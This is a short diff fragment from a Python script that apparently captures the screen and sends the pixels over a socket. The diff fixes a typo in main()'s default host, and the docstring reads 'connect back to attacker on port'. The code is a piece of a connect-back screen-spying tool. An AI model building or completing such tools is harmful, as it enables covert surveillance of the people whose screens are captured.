@@ -37,7 +37,7 @@ def screenshare():
                                         # Send pixels
                                         conn.sendall(pixels)
 
-          def main(host='127.0.01', port=1234):
+          def main(host='127.0.0.1', port=1234):
                     ''' connect back to attacker on port'''
                     sock = socket.socket()
                     sock.connect((host, port))
